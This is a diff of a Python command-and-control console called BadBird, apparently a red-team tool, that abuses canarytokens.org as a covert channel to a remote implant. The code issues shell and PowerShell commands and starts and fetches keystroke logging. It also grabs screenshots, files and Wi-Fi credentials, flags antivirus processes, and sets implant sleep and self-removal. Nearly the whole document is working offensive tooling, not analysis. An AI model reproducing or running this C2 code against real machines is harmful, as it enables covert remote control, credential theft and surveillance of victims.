@@ -1,25 +1,24 @@
+#!/usr/bin/env python3
+
 # BadBird C2 Through Canarytokens
 # Author: Austin Martin @amartinsec/blog.amartinsec.com
 
 # Imports
 import base64
-import os
 import platform
 import re
 
 import requests
 from bs4 import BeautifulSoup
-# Clear screen on start for colorama to work in Windows shell
-from colorama import init
-
 # TODO: fake_useragent is a pretty much a dead project. I'll add custom agents soon that will be used
 from fake_useragent import UserAgent
 
-
+from resources.modules.genimplant import *
 from resources.modules.helpmenu import *
 from resources.modules.postExp import *
-from resources.modules.genimplant import *
 from resources.modules.processhighlight import *
+
+# Clear screen on start for colorama to work in Windows shell
 
 # Globals
 ua = UserAgent()
@@ -47,8 +46,8 @@ requestedfile = ""
 
 def generate_canarytoken():
     # Check if template loot dir exists. If not, create it
-    #lootdir = os.path.dirname(lootpath)
-    #if not os.path.exists(lootdir):
+    # lootdir = os.path.dirname(lootpath)
+    # if not os.path.exists(lootdir):
     #    os.makedirs(lootdir)
 
     stripedUA = ua.random
@@ -102,10 +101,11 @@ def generate_canarytoken():
 
 # Task implant with running command
 def taskCommand(cmd):
-    if pwd == True:
+    if pwd:
         cmd = "pwdtask:" + cmd
 
-    if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith("download:") or cmd.startswith("wificreds:"):
+    if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith(
+            "download:") or cmd.startswith("wificreds:"):
         cmd = cmd
 
     else:
@@ -129,8 +129,10 @@ def taskCommand(cmd):
 
 # Animate for chunking
 def chunkAnimate():
-    for c in itertools.cycle([Fore.BLUE +'[|]'+ Fore.RESET+' Rebuilding Output   ', Fore.BLUE+'[/]' + Fore.RESET+' Rebuilding Output.  ',Fore.BLUE+ '[-]' + Fore.RESET +' Rebuilding Output.. ',
-                              Fore.BLUE + '[\\]' + Fore.RESET +' Rebuilding Output...']):
+    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Rebuilding Output   ',
+                              Fore.BLUE + '[/]' + Fore.RESET + ' Rebuilding Output.  ',
+                              Fore.BLUE + '[-]' + Fore.RESET + ' Rebuilding Output.. ',
+                              Fore.BLUE + '[\\]' + Fore.RESET + ' Rebuilding Output...']):
         if doneChunked:
             break
         sys.stdout.write('\r' + c)
@@ -166,7 +168,7 @@ def getResults(lastdictsize):
         data = soup.find_all("td")
 
         for tr in data:
-            if ("useragent" in tr.text):
+            if "useragent" in tr.text:
                 reslist.append(data[data.index(tr) + 1].text.strip())
 
         showChunkWarning = True
@@ -176,19 +178,19 @@ def getResults(lastdictsize):
             print(Fore.BLUE + "[!]" + Fore.RESET + " Rerun last command after reconnection...")
             time.sleep(5)
             fallback()
-            return (1)
+            return 1
 
         try:
             for count in reslist:
                 cmd = base64.b64decode(count).decode('utf-8')
 
                 # Response was too long to send in >50 chunks, generate new token
-                if (cmd == "toolong:"):
+                if cmd == "toolong:":
                     print(
                         Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to reconstruct. Command can not be ran")
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token to be safe")
                     fallback()
-                    return (1)
+                    return 1
 
                 # nightmare fuel
                 elif cmd.startswith("chunked:"):
@@ -215,7 +217,7 @@ def getResults(lastdictsize):
                         trash = soupChunk.find_all("td")
 
                         for x in trash:
-                            if ("useragent" in x.text):
+                            if "useragent" in x.text:
                                 chunkedlist.append(x.find_next_sibling().string.strip())
 
                         # Loop until we have ALL the chunked data
@@ -241,16 +243,16 @@ def getResults(lastdictsize):
                     doneChunked = True
                     stringbuilder = stringbuilder.replace("res:", "")
 
-                    if ps == True:
+                    if ps:
                         ps = False
                         highlightprocesses(decodedlist[-1])
                         fallback()
-                        return (1)
+                        return 1
 
                     print(Fore.GREEN + "[+]" + Fore.RESET + " Result: \n" + stringbuilder)
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token after chunked request...")
                     fallback()
-                    return (1)
+                    return 1
 
                 elif cmd.startswith("pic:"):
                     command = cmd.replace("pic:", "")
@@ -275,7 +277,7 @@ def getResults(lastdictsize):
                         trash = soupChunk.find_all("td")
 
                         for x in trash:
-                            if ("useragent" in x.text):
+                            if "useragent" in x.text:
                                 chunkedlist.append(x.find_next_sibling().string.strip())
 
                         # Loop until we have ALL the chunked data
@@ -305,7 +307,7 @@ def getResults(lastdictsize):
                         f.close()
                     print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Screenshot saved to " + lootpath + timestr + ".jpg")
 
-                    #To open screenshot after capturing it
+                    # To open screenshot after capturing it
                     try:
                         os.system("start " + lootpath + timestr + ".jpg")
                     except:
@@ -313,7 +315,7 @@ def getResults(lastdictsize):
 
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after screenshot...")
                     fallback()
-                    return (1)
+                    return 1
 
                 elif cmd.startswith("incomingfile:"):
                     command = cmd.replace("incomingfile:", "")
@@ -338,7 +340,7 @@ def getResults(lastdictsize):
                         trash = soupChunk.find_all("td")
 
                         for x in trash:
-                            if ("useragent" in x.text):
+                            if "useragent" in x.text:
                                 chunkedlist.append(x.find_next_sibling().string.strip())
 
                         # Loop until we have ALL the chunked data
@@ -366,11 +368,12 @@ def getResults(lastdictsize):
                     with open(lootpath + timestr + requestedfile, "wb") as f:
                         f.write(filebytes)
                         f.close()
-                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " File saved to " + lootpath + timestr + "_" + requestedfile)
+                    print(
+                        Fore.GREEN + "\n\n[+]" + Fore.RESET + " File saved to " + lootpath + timestr + "_" + requestedfile)
 
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after file grab...")
                     fallback()
-                    return (1)
+                    return 1
 
                 elif cmd.startswith("res:"):
                     command = cmd.replace("res:", "")
@@ -398,7 +401,7 @@ def getResults(lastdictsize):
 
 
                 # if keylogging results
-                elif (decodedlist[-1].startswith("keys:")):
+                elif decodedlist[-1].startswith("keys:"):
                     decodedlist[-1] = decodedlist[-1].replace("keys:", "")
                     print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Keystroke since last fetch: \n" + decodedlist[
                         -1] + "\n")
@@ -415,7 +418,7 @@ def getResults(lastdictsize):
                     break
 
                 else:
-                    if (pwd == True):
+                    if pwd == True:
                         print(decodedlist[-1])
                         break
 
@@ -425,18 +428,20 @@ def getResults(lastdictsize):
 
 
         except Exception as e:
-            #print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
-            #exc_type, exc_obj, exc_tb = sys.exc_info()
-            #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            #print(exc_type, fname, exc_tb.tb_lineno)
+            # print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
+            # exc_type, exc_obj, exc_tb = sys.exc_info()
+            # fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            # print(exc_type, fname, exc_tb.tb_lineno)
             pass
 
-    return (len(reslist) + 1)
+    return len(reslist) + 1
 
 
 def animateWaitForImplant():
-    for c in itertools.cycle([Fore.BLUE+'[|]' +Fore.RESET+' Waiting for implant connection   ',Fore.BLUE+ '[/]'+Fore.RESET+' Waiting for implant connection.  ',
-                              Fore.BLUE+'[-]'+Fore.RESET+' Waiting for implant connection.. ',Fore.BLUE+ '[\\]'+Fore.RESET+' Waiting for implant connection...']):
+    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Waiting for implant connection   ',
+                              Fore.BLUE + '[/]' + Fore.RESET + ' Waiting for implant connection.  ',
+                              Fore.BLUE + '[-]' + Fore.RESET + ' Waiting for implant connection.. ',
+                              Fore.BLUE + '[\\]' + Fore.RESET + ' Waiting for implant connection...']):
         if doneWaitForImplant:
             break
         sys.stdout.write('\r' + c)
@@ -454,7 +459,7 @@ def wait_for_implant():
     t.start()
 
     loop = True
-    while loop == True:
+    while loop:
         time.sleep(1)
         stripedUA = ua.random.strip()
         headers = {
@@ -506,11 +511,13 @@ def implantSleep(time, jitter):
 
 
 def animateFetchKeylog():
-    for c in itertools.cycle([Fore.BLUE+'[|]'+Fore.RESET+' Requesting Keystrokes   ',Fore.BLUE+ '[/]'+Fore.RESET+' Requesting Keystrokes.  ',Fore.BLUE+ '[-]'+Fore.RESET+' Requesting Keystrokes.. ',
-                              Fore.BLUE+'[\\]'+Fore.RESET+' Requesting Keystrokes...']):
+    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Requesting Keystrokes   ',
+                              Fore.BLUE + '[/]' + Fore.RESET + ' Requesting Keystrokes.  ',
+                              Fore.BLUE + '[-]' + Fore.RESET + ' Requesting Keystrokes.. ',
+                              Fore.BLUE + '[\\]' + Fore.RESET + ' Requesting Keystrokes...']):
         if waitForKeys:
             break
-        sys.stdout.write('\r' +c)
+        sys.stdout.write('\r' + c)
         sys.stdout.flush()
         time.sleep(0.25)
 
@@ -577,9 +584,8 @@ def fallback():
         pass
 
 
-
 def killimplant(clean):
-    if clean == False:
+    if not clean:
         while True:
             choice = input(
                 Fore.BLUE + "[!]" + Fore.RESET + " Do you want the implant to remove itself from the system? (y/n): ").lower()
@@ -600,11 +606,11 @@ def killimplant(clean):
     else:
         print(Fore.BLUE + "[!]" + Fore.RESET + " Killing and removing implant from system...\n")
 
-    if clean == True:
-        cmd = ("solongclean:")
+    if clean:
+        cmd = "solongclean:"
 
     else:
-        cmd = ("solongdirty:")
+        cmd = "solongdirty:"
 
     cmd = base64.b64encode(cmd.encode("utf-8"))
     headers = {
@@ -617,10 +623,12 @@ def killimplant(clean):
 
 
 def animate():
-    for c in itertools.cycle([Fore.BLUE+'[|]'+Fore.RESET+' loading   ',Fore.BLUE+ '[/]'+Fore.RESET+' loading.  ',Fore.BLUE+ '[-]'+Fore.RESET+' loading.. ',Fore.BLUE+ '[\\]'+Fore.RESET+' loading...']):
+    for c in itertools.cycle(
+            [Fore.BLUE + '[|]' + Fore.RESET + ' loading   ', Fore.BLUE + '[/]' + Fore.RESET + ' loading.  ',
+             Fore.BLUE + '[-]' + Fore.RESET + ' loading.. ', Fore.BLUE + '[\\]' + Fore.RESET + ' loading...']):
         if done:
             break
-        sys.stdout.write('\r' +c)
+        sys.stdout.write('\r' + c)
         sys.stdout.flush()
         time.sleep(0.25)
 
@@ -631,7 +639,7 @@ def main():
     welcome()
     # Need to investigate further, but running on Linux was extremely unstable so adding below:
     currentOS = platform.system()
-    if (currentOS != "Windows"):
+    if currentOS != "Windows":
         print(
             Fore.RED + "\n[-]" + Fore.RESET + " As of now, must be ran on Windows. Sorry :( Current OS: " + currentOS + "\n")
         return
@@ -643,11 +651,11 @@ def main():
     global url
     global lootpath
     global requestedfile
-    lootpath ="loot/template/"
+    lootpath = "loot/template/"
     global canaryManagementURL
     try:
         while True:
-            if (pwd == False):
+            if pwd == False:
                 cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)
             else:
                 try:
@@ -655,10 +663,8 @@ def main():
                 except:
                     cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)
 
-
-
             if cmd.lower() == "exit":
-                if connected == True:
+                if connected:
                     print(Fore.RED + "[-]" + Fore.RESET + " You currently have an implant connected.")
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " Would you like to kill the implant before disconnecting? (`y`/`n`)")
@@ -698,7 +704,7 @@ def main():
 
 
             elif cmd.lower().startswith("sleep"):
-                if connected == True:
+                if connected:
                     try:
                         sleeptime = cmd.split("sleep ")[1]
                         try:
@@ -715,7 +721,7 @@ def main():
                         implantSleep(int(sleeptime), int(jitterpercent))
                         if jitterpercent != 0:
                             print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
-                            sleeptime) + " seconds with a " + jitterpercent + "% jitter before checking in with the canarytokens.org server\n")
+                                sleeptime) + " seconds with a " + jitterpercent + "% jitter before checking in with the canarytokens.org server\n")
                         else:
                             print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
                                 sleeptime) + " seconds before checking in with the canarytokens.org server\n")
@@ -736,19 +742,19 @@ def main():
                     # regex for a valid email
                     regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                     enteredemail = cmd.split("email ")[1]
-                    if (re.fullmatch(regex, enteredemail)):
+                    if re.fullmatch(regex, enteredemail):
                         email = enteredemail
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Will now use `" + email + "` for creating tokens\n")
                     else:
                         print(Fore.RED + "[-]" + Fore.RESET + " Invalid email address\n")
 
-                except Exception as e:
+                except:
                     print(Fore.RED + "[-]" + Fore.RESET + " Error with setting new email\n")
 
 
             elif cmd.lower() == "pwd":
-                if connected == True:
-                    if pwd == False:
+                if connected:
+                    if not pwd:
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
                         pwd = True
                     else:
@@ -759,14 +765,14 @@ def main():
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
             elif cmd.lower() == "fallback":
-                if connected == True:
+                if connected:
                     fallback()
                 else:
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
             elif cmd.lower() == "kill":
-                if connected == True:
+                if connected:
                     killimplant(False)
                     connected = False
                 else:
@@ -775,7 +781,7 @@ def main():
 
 
             elif cmd.lower() == "kill clean":
-                if connected == True:
+                if connected:
                     killimplant(True)
                     connected = False
                 else:
@@ -784,7 +790,7 @@ def main():
 
 
             elif cmd.lower() == "post-exp":
-                if connected == True:
+                if connected:
                     print(Fore.BLUE + "[!]" + Fore.RESET + " Entering BadBird post-exploitation shell...\n")
                     cmd = postExpShell()
                     if cmd != "":
@@ -797,7 +803,7 @@ def main():
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
             elif cmd.lower() == "screenshot":
-                if connected == True:
+                if connected:
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
                     fallback()
                     time.sleep(1)
@@ -809,7 +815,7 @@ def main():
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
             elif cmd.startswith("download "):
-                if connected == True:
+                if connected:
                     requestedfile = cmd.split("download ")[1]
                     fallback()
                     time.sleep(1)
@@ -821,7 +827,7 @@ def main():
 
 
             elif cmd.lower() == "create-implant":
-                if (connected == True):
+                if connected:
                     print(
                         Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a connected implant. If you create a new one, you will lose the old one.")
                     choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
@@ -845,7 +851,7 @@ def main():
                     wait_for_implant()
 
             elif cmd.lower() == "create-token":
-                if (canaryManagementURL != ""):
+                if connected:
                     print(
                         Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a token. If you create a new one, you will lose the old one.")
                     choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
@@ -869,7 +875,7 @@ def main():
                     wait_for_implant()
 
             elif cmd.lower() == "canary-info":
-                if connected == True:
+                if connected:
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Token: " + token)
                     print(Fore.BLUE + "[!]" + Fore.RESET + " Alert URL: " + url)
                     print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
@@ -880,7 +886,7 @@ def main():
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
             elif cmd.lower() == "ps":
-                if connected == True:
+                if connected:
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Attempting to grab a list of running processes...\n")
                     print(
                         Fore.BLUE + "[!]" + Fore.RESET + " Suspected AV processes will be highlighted in " + Fore.RED + "RED" + Fore.RESET)
@@ -902,7 +908,7 @@ def main():
 
 
             elif cmd.lower().startswith("keystrokes"):
-                if connected == True:
+                if connected:
                     keychoice = cmd.replace("keystrokes ", "")
                     if keychoice.lower() != "start" and keychoice.lower() != "stop" and keychoice.lower() != "fetch":
                         print(
@@ -917,7 +923,7 @@ def main():
 
 
             elif cmd.lower().startswith("powershell "):
-                if connected == True:
+                if connected:
                     taskCommand("powershell.exe -c " + cmd.split("powershell ")[1])
                     lastdictsize = getResults(lastdictsize)
 
@@ -927,7 +933,7 @@ def main():
 
 
             elif cmd.lower().startswith("shell "):
-                if connected == True:
+                if connected:
                     cmd = cmd.replace("shell ", "", 1)
                     taskCommand(cmd)
                     lastdictsize = getResults(lastdictsize)
@@ -935,7 +941,7 @@ def main():
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
-            elif cmd=="":
+            elif cmd == "":
                 continue
 
             # If none of the above is true
